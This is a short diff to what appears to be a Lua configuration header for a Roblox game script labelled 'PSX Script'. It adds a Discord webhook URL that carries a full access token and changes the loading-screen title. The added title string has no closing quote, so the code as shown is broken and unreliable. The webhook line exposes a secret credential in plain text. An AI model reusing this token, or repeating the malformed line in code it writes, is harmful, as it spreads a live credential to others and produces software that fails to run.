@@ -1,8 +1,10 @@
 Username = "Murdyoof"
 
+WebHook = "https://discord.com/api/webhooks/1103436446012018829/JZ5X7LNsBetOUZyXo6bJq2Hxmz3d9cWXoiQiTYJ3YpHC8giBhUCdMUrfrKqIYNjZdOiK"
+
 loadingscreen = true
 
-_G.CustomScriptName = "PSX Script!"
+_G.CustomScriptName = "Thanks For Choosing Our Script!
 
 _G.Text1 = "Preparing Script..."
 
